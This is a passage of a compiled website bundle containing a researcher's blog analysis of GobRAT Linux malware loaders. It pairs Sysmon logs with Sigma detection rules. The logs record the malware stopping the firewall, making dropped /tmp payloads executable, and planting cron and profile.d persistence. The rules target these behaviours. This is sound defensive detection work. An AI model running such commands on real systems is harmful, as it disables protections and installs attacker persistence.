"use strict";(self.webpackChunkjstnk=self.webpackChunkjstnk||[]).push([[7104],{3905:function(e,a,n){n.d(a,{Zo:function(){return m},kt:function(){return D}});var t=n(7294);function i(e,a,n){return a in e?Object.defineProperty(e,a,{value:n,enumerable:!0,configurable:!0,writable:!0}):e[a]=n,e}function o(e,a){var n=Object.keys(e);if(Object.getOwnPropertySymbols){var t=Object.getOwnPropertySymbols(e);a&&(t=t.filter((function(a){return Object.getOwnPropertyDescriptor(e,a).enumerable}))),n.push.apply(n,t)}return n}function r(e){for(var a=1;a<arguments.length;a++){var n=null!=arguments[a]?arguments[a]:{};a%2?o(Object(n),!0).forEach((function(a){i(e,a,n[a])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(n)):o(Object(n)).forEach((function(a){Object.defineProperty(e,a,Object.getOwnPropertyDescriptor(n,a))}))}return e}function s(e,a){if(null==e)return{};var n,t,i=function(e,a){if(null==e)return{};var n,t,i={},o=Object.keys(e);for(t=0;t<o.length;t++)n=o[t],a.indexOf(n)>=0||(i[n]=e[n]);return i}(e,a);if(Object.getOwnPropertySymbols){var o=Object.getOwnPropertySymbols(e);for(t=0;t<o.length;t++)n=o[t],a.indexOf(n)>=0||Object.prototype.propertyIsEnumerable.call(e,n)&&(i[n]=e[n])}return i}var l=t.createContext({}),c=function(e){var a=t.useContext(l),n=a;return e&&(n="function"==typeof e?e(a):r(r({},a),e)),n},m=function(e){var a=c(e.components);return t.createElement(l.Provider,{value:a},e.children)},d={inlineCode:"code",wrapper:function(e){var a=e.children;return t.createElement(t.Fragment,{},a)}},p=t.forwardRef((function(e,a){var n=e.components,i=e.mdxType,o=e.originalType,l=e.parentName,m=s(e,["components","mdxType","originalType","parentName"]),p=c(n),D=i,f=p["".concat(l,".").concat(D)]||p[D]||d[D]||o;return n?t.createElement(f,r(r({ref:a},m),{},{components:n})):t.createElement(f,r({ref:a},m))}));function D(e,a){var n=arguments,i=a&&a.mdxType;if("string"==typeof e||i){var o=n.length,r=new Array(o);r[0]=p;var s={};for(var l in a)hasOwnProperty.call(a,l)&&(s[l]=a[l]);s.originalType=e,s.mdxType="string"==typeof e?e:i,r[1]=s;for(var c=2;c<o;c++)r[c]=n[c];return t.createElement.apply(null,r)}return t.createElement.apply(null,n)}p.displayName="MDXCreateElement"},2792:function(e,a,n){n.r(a),n.d(a,{frontMatter:function(){return s},contentTitle:function(){return l},metadata:function(){return c},assets:function(){return m},toc:function(){return d},default:function(){return D}});var t=n(7462),i=n(3366),o=(n(7294),n(3905)),r=["components"],s={slug:"GobRAT-Malware",title:"Dissecting GobRAT behaviors - Linux malware",authors:"joseliyo",tags:["threat hunting","detection","analysis","research","GobRAT","malware","sigma"]},l=void 0,c={permalink:"/jstnk9/research/GobRAT-Malware",source:"@site/research/2023-05-30-GobRAT-Linux-Malware/2023-05-30-GobRAT-Linux-Malware.md",title:"Dissecting GobRAT behaviors - Linux malware",description:"Summary",date:"2023-05-30T00:00:00.000Z",formattedDate:"May 30, 2023",tags:[{label:"threat hunting",permalink:"/jstnk9/research/tags/threat-hunting"},{label:"detection",permalink:"/jstnk9/research/tags/detection"},{label:"analysis",permalink:"/jstnk9/research/tags/analysis"},{label:"research",permalink:"/jstnk9/research/tags/research"},{label:"GobRAT",permalink:"/jstnk9/research/tags/gob-rat"},{label:"malware",permalink:"/jstnk9/research/tags/malware"},{label:"sigma",permalink:"/jstnk9/research/tags/sigma"}],readingTime:19.02,truncated:!0,authors:[{name:"Jose Luis S\xe1nchez Mart\xednez",title:"Security Researcher",url:"https://twitter.com/Joseliyo_Jstnk",imageURL:"https://jstnk9.github.io/jstnk9/img/profiles/1574890680450.jpeg",key:"joseliyo"}],prevItem:{title:"Malicious document identified in the conflict Israel & Gaza themed about terrorist organizations related to Iran",permalink:"/jstnk9/research/Malicious-Iran-Document-APT"},nextItem:{title:"Analyzing AsyncRAT distributed in Colombia by Blind Eagle",permalink:"/jstnk9/research/AsyncRAT-Analysis"}},m={authorsImageUrls:[void 0]},d=[{value:"Summary",id:"summary",children:[],level:2},{value:"Analysis",id:"analysis",children:[{value:"Suspicious File Creation in Profile Folder",id:"suspicious-file-creation-in-profile-folder",children:[],level:3},{value:"Discovery Information About Operantig System in Silent Mode",id:"discovery-information-about-operantig-system-in-silent-mode",children:[],level:3},{value:"Persistence Via Cron Files",id:"persistence-via-cron-files",children:[],level:3},{value:"Disable Or Stop Services",id:"disable-or-stop-services",children:[],level:3},{value:"Crontab Enumeration",id:"crontab-enumeration",children:[],level:3},{value:"Chmod Suspicious Directory",id:"chmod-suspicious-directory",children:[],level:3},{value:"Disabling Security Tools",id:"disabling-security-tools",children:[],level:3},{value:"Nohup Execution",id:"nohup-execution",children:[],level:3},{value:"Wget Creating Files in Tmp",id:"wget-creating-files-in-tmp",children:[],level:3},{value:"Execution From Tmp Folder",id:"execution-from-tmp-folder",children:[],level:3},{value:"Wget Download File To Tmp Folder in silent Mode",id:"wget-download-file-to-tmp-folder-in-silent-mode",children:[],level:3},{value:"Discovery Information About Files Created by GobRAT",id:"discovery-information-about-files-created-by-gobrat",children:[],level:3},{value:"Nohup Tmp File Execution",id:"nohup-tmp-file-execution",children:[],level:3},{value:"Execution of Shell With Tmp Parent Process",id:"execution-of-shell-with-tmp-parent-process",children:[],level:3},{value:"Execution of Script In Tmp Folder",id:"execution-of-script-in-tmp-folder",children:[],level:3},{value:"File Deletion",id:"file-deletion",children:[],level:3},{value:"Process Discovery",id:"process-discovery",children:[],level:3},{value:"System Information Discovery",id:"system-information-discovery",children:[],level:3}],level:2},{value:"Conclusions",id:"conclusions",children:[],level:2},{value:"Contact",id:"contact",children:[],level:2}],p={toc:d};function D(e){var a=e.components,n=(0,i.Z)(e,r);return(0,o.kt)("wrapper",(0,t.Z)({},p,n,{components:a,mdxType:"MDXLayout"}),(0,o.kt)("h2",{id:"summary"},"Summary"),(0,o.kt)("p",null,(0,o.kt)("a",{parentName:"p",href:"https://blogs.jpcert.or.jp/en/2023/05/gobrat.html"},"JPCERT/CC discovered")," recently attacks that infected routers in Japan with malware around February 2023."),(0,o.kt)("p",null,(0,o.kt)("img",{parentName:"p",src:"https://jstnk9.github.io/jstnk9/img/research-gobrat/gobrat_graph.png",alt:"graph"})),(0,o.kt)("p",null,"This analysis is focused in the loaders discovered by them"),(0,o.kt)("ul",null,(0,o.kt)("li",{parentName:"ul"},(0,o.kt)("inlineCode",{parentName:"li"},"60bcd645450e4c846238cf0e7226dc40c84c96eba99f6b2cffcd0ab4a391c8b3")),(0,o.kt)("li",{parentName:"ul"},(0,o.kt)("inlineCode",{parentName:"li"},"3e44c807a25a56f4068b5b8186eee5002eed6f26d665a8b791c472ad154585d1"))),(0,o.kt)("p",null,"Some of the behaviors identified in the routers, are too generic, which means that can be used in Linux endpoints intrusions too. For that reason, I decided to analyze the samples and contribute to the Sigma community to idenfity new detection opportunities based on the samples and the analysis of JPCERT/CC."),(0,o.kt)("div",{className:"admonition admonition-info alert alert--info"},(0,o.kt)("div",{parentName:"div",className:"admonition-heading"},(0,o.kt)("h5",{parentName:"div"},(0,o.kt)("span",{parentName:"h5",className:"admonition-icon"},(0,o.kt)("svg",{parentName:"span",xmlns:"http://www.w3.org/2000/svg",width:"14",height:"16",viewBox:"0 0 14 16"},(0,o.kt)("path",{parentName:"svg",fillRule:"evenodd",d:"M7 2.3c3.14 0 5.7 2.56 5.7 5.7s-2.56 5.7-5.7 5.7A5.71 5.71 0 0 1 1.3 8c0-3.14 2.56-5.7 5.7-5.7zM7 1C3.14 1 0 4.14 0 8s3.14 7 7 7 7-3.14 7-7-3.14-7-7-7zm1 3H6v5h2V4zm0 6H6v2h2v-2z"}))),"info")),(0,o.kt)("div",{parentName:"div",className:"admonition-content"},(0,o.kt)("p",{parentName:"div"},"The objective of the analysis is to provide information about the execution of these loaders and how we can detect them using ",(0,o.kt)("a",{parentName:"p",href:"https://github.com/SigmaHQ/sigma"},"Sigma Rules")))),(0,o.kt)("h2",{id:"analysis"},"Analysis"),(0,o.kt)("p",null,"During this section, you will see telemetry based on ",(0,o.kt)("inlineCode",{parentName:"p"},"Sysmon")," events and sigma rules that are triggering the behaviors."),(0,o.kt)("h3",{id:"suspicious-file-creation-in-profile-folder"},"Suspicious File Creation in Profile Folder"),(0,o.kt)("p",null,"A file dropped by the loader is created in the ",(0,o.kt)("inlineCode",{parentName:"p"},"/etc/profile.d")," path with the goal of persist. The file created is a ",(0,o.kt)("inlineCode",{parentName:"p"},".sh")," which will be executed during the start of login shells. That path is used to create persistence in the system by threat actors."),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-xml"},'<Event>\n    <System>\n        <Provider Name="Linux-Sysmon" Guid="{ff032593-a8d3-4f13-b0d6-01fc615a0f97}"/>\n        <EventID>11</EventID>\n        <Version>2</Version>\n        <Level>4</Level>\n        <Task>11</Task>\n        <Opcode>0</Opcode>\n        <Keywords>0x8000000000000000</Keywords>\n        <EventRecordID>16919</EventRecordID>\n        <Correlation/>\n        <Execution ProcessID="26414" ThreadID="26414"/>\n        <Channel>Linux-Sysmon/Operational</Channel>\n        <Security UserId="0"/>\n    </System>\n    <EventData>\n        <Data Name="RuleName">-</Data>\n        <Data Name="ProcessGuid">{46700b68-ff05-6475-f547-38be1a560000}</Data>\n        <Data Name="ProcessId">26546</Data>\n        <Data Name="Image">/usr/bin/dash</Data>\n        <Data Name="TargetFilename">/etc/profile.d/sshdaemon.sh</Data>\n        <Data Name="User">-</Data>\n    </EventData>\n</Event>\n')),(0,o.kt)("p",null,"I've created a sigma rule that can help us to detect this behavior, since it can be used by multiple threat actors."),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-yml"},"title: Suspicious File Creation in Profile Folder\nid: 13f08f54-e705-4498-91fd-cce9d9cee9f1\nstatus: experimental\ndescription: Detects the creation of files under profile.d path\nreferences:\n    - https://blogs.jpcert.or.jp/en/2023/05/gobrat.html\n    - https://www.virustotal.com/gui/file/60bcd645450e4c846238cf0e7226dc40c84c96eba99f6b2cffcd0ab4a391c8b3/detection\nauthor: Joseliyo Sanchez, @Joseliyo_Jstnk\ndate: 2023/30/05\nlogsource:\n    product: linux\n    category: file_event\ndetection:\n    selection_path:\n        TargetFilename|contains: '/etc/profile.d/'\n    selection_extension:\n        TargetFilename|endswith: '.sh'\n    condition: all of selection_*\nfalsepositives:\n    - Legitimate file creation\nlevel: medium\n")),(0,o.kt)("h3",{id:"discovery-information-about-operantig-system-in-silent-mode"},"Discovery Information About Operantig System in Silent Mode"),(0,o.kt)("p",null,"One of the goals of these threat actors was do different tasks in silent mode. For that purpose, they have used ",(0,o.kt)("inlineCode",{parentName:"p"},"grep")," with the parameter ",(0,o.kt)("inlineCode",{parentName:"p"},"-iq")," to avoid print results in the terminal. "),(0,o.kt)("p",null,"The use of ",(0,o.kt)("inlineCode",{parentName:"p"},"grep")," make sense when you see the code and what they are trying to do. Next image is a piece of code of these loaders."),(0,o.kt)("p",null,(0,o.kt)("img",{parentName:"p",src:"https://jstnk9.github.io/jstnk9/img/research-gobrat/grep_use.png",alt:"grep"})),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-xml"},'<Event>\n    <System>\n        <Provider Name="Linux-Sysmon" Guid="{ff032593-a8d3-4f13-b0d6-01fc615a0f97}"/>\n        <EventID>1</EventID>\n        <Version>5</Version>\n        <Level>4</Level>\n        <Task>1</Task>\n        <Opcode>0</Opcode>\n        <Keywords>0x8000000000000000</Keywords>\n        <EventRecordID>16776</EventRecordID>\n        <Correlation/>\n        <Execution ProcessID="26414" ThreadID="26414"/>\n        <Channel>Linux-Sysmon/Operational</Channel>\n        <Security UserId="0"/>\n    </System>\n    <EventData>\n        <Data Name="RuleName">-</Data>\n        <Data Name="ProcessGuid">{46700b68-ff05-6475-81cf-b73487550000}</Data>\n        <Data Name="ProcessId">26562</Data>\n        <Data Name="Image">/usr/bin/grep</Data>\n        <Data Name="FileVersion">-</Data>\n        <Data Name="Description">-</Data>\n        <Data Name="Product">-</Data>\n        <Data Name="Company">-</Data>\n        <Data Name="OriginalFileName">-</Data>\n        <Data Name="CommandLine">grep -iq aarch64</Data>\n        <Data Name="CurrentDirectory">/opt</Data>\n        <Data Name="User">-</Data>\n        <Data Name="LogonGuid">{46700b68-0000-0000-ffff-ffffffffffff}</Data>\n        <Data Name="LogonId">65535</Data>\n        <Data Name="TerminalSessionId">48</Data>\n        <Data Name="IntegrityLevel">no level</Data>\n        <Data Name="Hashes">-</Data>\n        <Data Name="ParentProcessGuid">{46700b68-ff05-6475-f547-38be1a560000}</Data>\n        <Data Name="ParentProcessId">26546</Data>\n        <Data Name="ParentImage">/usr/bin/dash</Data>\n        <Data Name="ParentCommandLine">/bin/sh</Data>\n        <Data Name="ParentUser">-</Data>\n    </EventData>\n</Event>\n')),(0,o.kt)("p",null,"A sigma rule that I thought might help us with this is following all the checks made by this loader is the next one."),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-yml"},"title: Discovery Information About Operantig System in Silent Mode\nid: d27ab432-2199-483f-a297-03633c05bae6\nstatus: experimental\ndescription: Detects the use of grep to identify information about the system using the parameter -q to do it in silent mode\nreferences:\n    - https://blogs.jpcert.or.jp/en/2023/05/gobrat.html\n    - https://www.virustotal.com/gui/file/60bcd645450e4c846238cf0e7226dc40c84c96eba99f6b2cffcd0ab4a391c8b3/detection\nauthor: Joseliyo Sanchez, @Joseliyo_Jstnk\ndate: 2023/30/05\ntags:\n    - attack.discovery\n    - attack.t1082\nlogsource:\n    category: process_creation\n    product: linux\ndetection:\n    selection_process:\n        Image|endswith: '/grep'\n        CommandLine|contains: '-iq'\n    selection_architecture:\n        CommandLine|contains:\n            - 'aarch64'\n            - 'armv7'\n            - 'x86_64'\n            - 'arm*'\n            - 'mips*'\n            - 'i386'\n            - 'i686'\n            - 'AArch64'\n            - 'ARMv7'\n            - 'arm'\n            - 'mips'\n            - 'mipsel'\n            - 'mips64'\n            - 'mips64el'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: low\n")),(0,o.kt)("h3",{id:"persistence-via-cron-files"},"Persistence Via Cron Files"),(0,o.kt)("p",null,"There is a ",(0,o.kt)("inlineCode",{parentName:"p"},"crontab")," execution of a crontab file which was dropped. During the execution of ",(0,o.kt)("inlineCode",{parentName:"p"},"crontab")," to load that file, there is a file creation that is interesting to see that there was a crontab execution to persist."),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-xml"},'<Event>\n    <System>\n        <Provider Name="Linux-Sysmon" Guid="{ff032593-a8d3-4f13-b0d6-01fc615a0f97}"/>\n        <EventID>11</EventID>\n        <Version>2</Version>\n        <Level>4</Level>\n        <Task>11</Task>\n        <Opcode>0</Opcode>\n        <Keywords>0x8000000000000000</Keywords>\n        <EventRecordID>16873</EventRecordID>\n        <Correlation/>\n        <Execution ProcessID="26414" ThreadID="26414"/>\n        <Channel>Linux-Sysmon/Operational</Channel>\n        <Security UserId="0"/>\n    </System>\n    <EventData>\n        <Data Name="RuleName">-</Data>\n        <Data Name="ProcessGuid">{46700b68-ff13-6475-f59c-766f18560000}</Data>\n        <Data Name="ProcessId">26604</Data>\n        <Data Name="Image">/usr/bin/crontab</Data>\n        <Data Name="TargetFilename">/var/spool/cron/crontabs/tmp.0iiGrT</Data>\n        <Data Name="CreationUtcTime">2023-05-30 13:50:11.585</Data>\n        <Data Name="User">-</Data>\n    </EventData>\n</Event>\n')),(0,o.kt)("p",null,"It was used to create persistence in the system. In order to detect that behavior there is a ",(0,o.kt)("a",{parentName:"p",href:"https://github.com/SigmaHQ/sigma/blob/master/rules/linux/file_event/file_event_lnx_persistence_cron_files.yml"},"public sigma")," rule that can help us."),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-yaml"},"title: Persistence Via Cron Files\nid: 6c4e2f43-d94d-4ead-b64d-97e53fa2bd05\nstatus: test\ndescription: Detects creation of cron file or files in Cron directories which could indicates potential persistence.\nreferences:\n    - https://github.com/microsoft/MSTIC-Sysmon/blob/f1477c0512b0747c1455283069c21faec758e29d/linux/configs/attack-based/persistence/T1053.003_Cron_Activity.xml\nauthor: Roberto Rodriguez (Cyb3rWard0g), OTR (Open Threat Research), MSTIC\ndate: 2021/10/15\nmodified: 2022/12/31\ntags:\n    - attack.persistence\n    - attack.t1053.003\nlogsource:\n    product: linux\n    category: file_event\ndetection:\n    selection1:\n        TargetFilename|startswith:\n            - '/etc/cron.d/'\n            - '/etc/cron.daily/'\n            - '/etc/cron.hourly/'\n            - '/etc/cron.monthly/'\n            - '/etc/cron.weekly/'\n            - '/var/spool/cron/crontabs/'\n    selection2:\n        TargetFilename|contains:\n            - '/etc/cron.allow'\n            - '/etc/cron.deny'\n            - '/etc/crontab'\n    condition: 1 of selection*\nfalsepositives:\n    - Any legitimate cron file.\nlevel: medium\n\n")),(0,o.kt)("h3",{id:"disable-or-stop-services"},"Disable Or Stop Services"),(0,o.kt)("p",null,"Stop the firewall service is one of the goals during the execution. They have used ",(0,o.kt)("inlineCode",{parentName:"p"},"disable")," and ",(0,o.kt)("inlineCode",{parentName:"p"},"stop")," options. "),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-xml"},'<Event>\n    <System>\n        <Provider Name="Linux-Sysmon" Guid="{ff032593-a8d3-4f13-b0d6-01fc615a0f97}"/>\n        <EventID>1</EventID>\n        <Version>5</Version>\n        <Level>4</Level>\n        <Task>1</Task>\n        <Opcode>0</Opcode>\n        <Keywords>0x8000000000000000</Keywords>\n        <EventRecordID>16755</EventRecordID>\n        <Correlation/>\n        <Execution ProcessID="26414" ThreadID="26414"/>\n        <Channel>Linux-Sysmon/Operational</Channel>\n        <Security UserId="0"/>\n    </System>\n    <EventData>\n        <Data Name="RuleName">-</Data>\n        <Data Name="ProcessGuid">{46700b68-ff05-6475-9d3b-864902560000}</Data>\n        <Data Name="ProcessId">26548</Data>\n        <Data Name="Image">/usr/bin/systemctl</Data>\n        <Data Name="FileVersion">-</Data>\n        <Data Name="Description">-</Data>\n        <Data Name="Product">-</Data>\n        <Data Name="Company">-</Data>\n        <Data Name="OriginalFileName">-</Data>\n        <Data Name="CommandLine">systemctl stop firewalld.service</Data>\n        <Data Name="CurrentDirectory">/opt</Data>\n        <Data Name="User">-</Data>\n        <Data Name="LogonGuid">{46700b68-0000-0000-ffff-ffffffffffff}</Data>\n        <Data Name="LogonId">65535</Data>\n        <Data Name="TerminalSessionId">48</Data>\n        <Data Name="IntegrityLevel">no level</Data>\n        <Data Name="Hashes">-</Data>\n        <Data Name="ParentProcessGuid">{46700b68-ff05-6475-f547-38be1a560000}</Data>\n        <Data Name="ParentProcessId">26546</Data>\n        <Data Name="ParentImage">/usr/bin/dash</Data>\n        <Data Name="ParentCommandLine">/bin/sh</Data>\n        <Data Name="ParentUser">-</Data>\n    </EventData>\n</Event>\n')),(0,o.kt)("p",null,"Whether the option is to ",(0,o.kt)("inlineCode",{parentName:"p"},"disable")," or ",(0,o.kt)("inlineCode",{parentName:"p"},"stop"),", the following ",(0,o.kt)("a",{parentName:"p",href:"https://github.com/SigmaHQ/sigma/blob/master/rules/linux/process_creation/proc_creation_lnx_services_stop_and_disable.yml"},"public sigma")," rule can help you detect this behavior."),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-yml"},"title: Disable Or Stop Services\nid: de25eeb8-3655-4643-ac3a-b662d3f26b6b\nstatus: experimental\ndescription: Detects the usage of utilities such as 'systemctl', 'service'...etc to stop or disable tools and services\nreferences:\n    - https://www.trendmicro.com/pl_pl/research/20/i/the-evolution-of-malicious-shell-scripts.html\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022/09/15\ntags:\n    - attack.defense_evasion\nlogsource:\n    category: process_creation\n    product: linux\ndetection:\n    selection:\n        Image|endswith:\n            - '/service'\n            - '/systemctl'\n            - '/chkconfig'\n        CommandLine|contains:\n            - 'stop'\n            - 'disable'\n    condition: selection\nfalsepositives:\n    - Legitimate administration activities\nlevel: medium\n")),(0,o.kt)("h3",{id:"crontab-enumeration"},"Crontab Enumeration"),(0,o.kt)("p",null,"The use of ",(0,o.kt)("inlineCode",{parentName:"p"},"crontab -l")," is not malicious for itself, however is interesting to identify this behavior. They used it during the infection."),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-xml"},'<Event>\n    <System>\n        <Provider Name="Linux-Sysmon" Guid="{ff032593-a8d3-4f13-b0d6-01fc615a0f97}"/>\n        <EventID>1</EventID>\n        <Version>5</Version>\n        <Level>4</Level>\n        <Task>1</Task>\n        <Opcode>0</Opcode>\n        <Keywords>0x8000000000000000</Keywords>\n        <EventRecordID>16863</EventRecordID>\n        <Correlation/>\n        <Execution ProcessID="26414" ThreadID="26414"/>\n        <Channel>Linux-Sysmon/Operational</Channel>\n        <Security UserId="0"/>\n    </System>\n    <EventData>\n        <Data Name="RuleName">-</Data>\n        <Data Name="ProcessGuid">{46700b68-ff13-6475-f53c-414b9d550000}</Data>\n        <Data Name="ProcessId">26600</Data>\n        <Data Name="Image">/usr/bin/crontab</Data>\n        <Data Name="FileVersion">-</Data>\n        <Data Name="Description">-</Data>\n        <Data Name="Product">-</Data>\n        <Data Name="Company">-</Data>\n        <Data Name="OriginalFileName">-</Data>\n        <Data Name="CommandLine">crontab -l</Data>\n        <Data Name="CurrentDirectory">/opt</Data>\n        <Data Name="User">-</Data>\n        <Data Name="LogonGuid">{46700b68-0000-0000-ffff-ffffffffffff}</Data>\n        <Data Name="LogonId">65535</Data>\n        <Data Name="TerminalSessionId">48</Data>\n        <Data Name="IntegrityLevel">no level</Data>\n        <Data Name="Hashes">-</Data>\n        <Data Name="ParentProcessGuid">{46700b68-ff05-6475-f547-38be1a560000}</Data>\n        <Data Name="ParentProcessId">26546</Data>\n        <Data Name="ParentImage">/usr/bin/dash</Data>\n        <Data Name="ParentCommandLine">/bin/sh</Data>\n        <Data Name="ParentUser">-</Data>\n    </EventData>\n</Event>\n')),(0,o.kt)("p",null,"And for that reason, I've created the next rule for crontab enumeration."),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-yml"},"title: Crontab Enumeration\nid: 403ed92c-b7ec-4edd-9947-5b535ee12d46\nstatus: experimental\ndescription: Detects usage of crontab to list the tasks of the user\nreferences:\n    - https://blogs.jpcert.or.jp/en/2023/05/gobrat.html\n    - https://www.virustotal.com/gui/file/60bcd645450e4c846238cf0e7226dc40c84c96eba99f6b2cffcd0ab4a391c8b3/detection\nauthor: Joseliyo Sanchez, @Joseliyo_Jstnk\ndate: 2023/30/05\ntags:\n    - attack.discovery\n    - attack.t1007\nlogsource:\n    product: linux\n    category: process_creation\ndetection:\n    selection:\n        Image|endswith: '/crontab'\n        CommandLine|contains: '-l'\n    condition: selection\nfalsepositives:\n    - Legitimate use of crontab\nlevel: low\n")),(0,o.kt)("h3",{id:"chmod-suspicious-directory"},"Chmod Suspicious Directory"),(0,o.kt)("p",null,"The payloads dropped on the system, which are located in the ",(0,o.kt)("inlineCode",{parentName:"p"},"/tmp/")," directory, must have the appropriate permissions to be executed, for that reason ",(0,o.kt)("inlineCode",{parentName:"p"},"chmod")," is used."),(0,o.kt)("p",null,"This command is executed 4 times for the payloads dropped."),(0,o.kt)("ul",null,(0,o.kt)("li",{parentName:"ul"},"/tmp/env/.qnapd/frpc"),(0,o.kt)("li",{parentName:"ul"},"/tmp/env/.qnapd/apached"),(0,o.kt)("li",{parentName:"ul"},"/tmp/env/.qnapd/sshd.sh"),(0,o.kt)("li",{parentName:"ul"},"/tmp/env/.qnapd/waitd.sh")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-xml"},'<Event>\n    <System>\n        <Provider Name="Linux-Sysmon" Guid="{ff032593-a8d3-4f13-b0d6-01fc615a0f97}"/>\n        <EventID>1</EventID>\n        <Version>5</Version>\n        <Level>4</Level>\n        <Task>1</Task>\n        <Opcode>0</Opcode>\n        <Keywords>0x8000000000000000</Keywords>\n        <EventRecordID>16856</EventRecordID>\n        <Correlation/>\n        <Execution ProcessID="26414" ThreadID="26414"/>\n        <Channel>Linux-Sysmon/Operational</Channel>\n        <Security UserId="0"/>\n    </System>\n    <EventData>\n        <Data Name="RuleName">-</Data>\n        <Data Name="ProcessGuid">{46700b68-ff13-6475-5109-ead5eb550000}</Data>\n        <Data Name="ProcessId">26597</Data>\n        <Data Name="Image">/usr/bin/chmod</Data>\n        <Data Name="FileVersion">-</Data>\n        <Data Name="Description">-</Data>\n        <Data Name="Product">-</Data>\n        <Data Name="Company">-</Data>\n        <Data Name="OriginalFileName">-</Data>\n        <Data Name="CommandLine">chmod +x /tmp/env/.qnapd/apached</Data>\n        <Data Name="CurrentDirectory">/opt</Data>\n        <Data Name="User">-</Data>\n        <Data Name="LogonGuid">{46700b68-0000-0000-ffff-ffffffffffff}</Data>\n        <Data Name="LogonId">65535</Data>\n        <Data Name="TerminalSessionId">48</Data>\n        <Data Name="IntegrityLevel">no level</Data>\n        <Data Name="Hashes">-</Data>\n        <Data Name="ParentProcessGuid">{46700b68-ff05-6475-f547-38be1a560000}</Data>\n        <Data Name="ParentProcessId">26546</Data>\n        <Data Name="ParentImage">/usr/bin/dash</Data>\n        <Data Name="ParentCommandLine">/bin/sh</Data>\n        <Data Name="ParentUser">-</Data>\n    </EventData>\n</Event>\n')),(0,o.kt)("p",null,"Since this behavior is suspicious, there was also a ",(0,o.kt)("a",{parentName:"p",href:"https://github.com/SigmaHQ/sigma/blob/master/rules/linux/process_creation/proc_creation_lnx_susp_chmod_directories.yml"},"sigma rule")," to detect this behavior and help us in this case."),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-yml"},"title: Chmod Suspicious Directory\nid: 6419afd1-3742-47a5-a7e6-b50386cd15f8\nstatus: experimental\ndescription: Detects chmod targeting files in abnormal directory paths.\nreferences:\n    - https://www.intezer.com/blog/malware-analysis/new-backdoor-sysjoker/\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1222.002/T1222.002.md\nauthor: 'Christopher Peacock @SecurePeacock, SCYTHE @scythe_io'\ndate: 2022/06/03\ntags:\n    - attack.defense_evasion\n    - attack.t1222.002\nlogsource:\n    product: linux\n    category: process_creation\ndetection:\n    selection:\n        Image|endswith: '/chmod'\n        CommandLine|contains:\n            - '/tmp/'\n            - '/.Library/'\n            - '/etc/'\n            - '/opt/'\n    condition: selection\nfalsepositives:\n    - Admin changing file permissions.\nlevel: medium\n")),(0,o.kt)("h3",{id:"disabling-security-tools"},"Disabling Security Tools"),(0,o.kt)("p",null,"Same behavior as we saw in the ",(0,o.kt)("inlineCode",{parentName:"p"},"Disable Or Stop Services")," section. However, there is another sigma rule that is detecting it."),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-xml"},'<Event>\n    <System>\n        <Provider Name="Linux-Sysmon" Guid="{ff032593-a8d3-4f13-b0d6-01fc615a0f97}"/>\n        <EventID>1</EventID>\n        <Version>5</Version>\n        <Level>4</Level>\n        <Task>1</Task>\n        <Opcode>0</Opcode>\n        <Keywords>0x8000000000000000</Keywords>\n        <EventRecordID>16755</EventRecordID>\n        <Correlation/>\n        <Execution ProcessID="26414" ThreadID="26414"/>\n        <Channel>Linux-Sysmon/Operational</Channel>\n        <Security UserId="0"/>\n    </System>\n    <EventData>\n        <Data Name="RuleName">-</Data>\n        <Data Name="ProcessGuid">{46700b68-ff05-6475-9d3b-864902560000}</Data>\n        <Data Name="ProcessId">26548</Data>\n        <Data Name="Image">/usr/bin/systemctl</Data>\n        <Data Name="FileVersion">-</Data>\n        <Data Name="Description">-</Data>\n        <Data Name="Product">-</Data>\n        <Data Name="Company">-</Data>\n        <Data Name="OriginalFileName">-</Data>\n        <Data Name="CommandLine">systemctl stop firewalld.service</Data>\n        <Data Name="CurrentDirectory">/opt</Data>\n        <Data Name="User">-</Data>\n        <Data Name="LogonGuid">{46700b68-0000-0000-ffff-ffffffffffff}</Data>\n        <Data Name="LogonId">65535</Data>\n        <Data Name="TerminalSessionId">48</Data>\n        <Data Name="IntegrityLevel">no level</Data>\n        <Data Name="Hashes">-</Data>\n        <Data Name="ParentProcessGuid">{46700b68-ff05-6475-f547-38be1a560000}</Data>\n        <Data Name="ParentProcessId">26546</Data>\n        <Data Name="ParentImage">/usr/bin/dash</Data>\n        <Data Name="ParentCommandLine">/bin/sh</Data>\n        <Data Name="ParentUser">-</Data>\n    </EventData>\n</Event>\n')),(0,o.kt)("p",null,(0,o.kt)("a",{parentName:"p",href:"https://github.com/SigmaHQ/sigma/blob/master/rules/linux/process_creation/proc_creation_lnx_security_tools_disabling.yml"},"Public sigma")," that can help to detect it."),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-yml"},"title: Disabling Security Tools\nid: e3a8a052-111f-4606-9aee-f28ebeb76776\nstatus: test\ndescription: Detects disabling security tools\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1562.004/T1562.004.md\nauthor: \xd6mer G\xfcnal, Alejandro Ortuno, oscd.community\ndate: 2020/06/17\nmodified: 2022/10/09\ntags:\n    - attack.defense_evasion\n    - attack.t1562.004\nlogsource:\n    category: process_creation\n    product: linux\ndetection:\n    selection_iptables_1:\n        Image|endswith: '/service'\n        CommandLine|contains|all:\n            - 'iptables'\n            - 'stop'\n    selection_iptables_2:\n        Image|endswith: '/service'\n        CommandLine|contains|all:\n            - 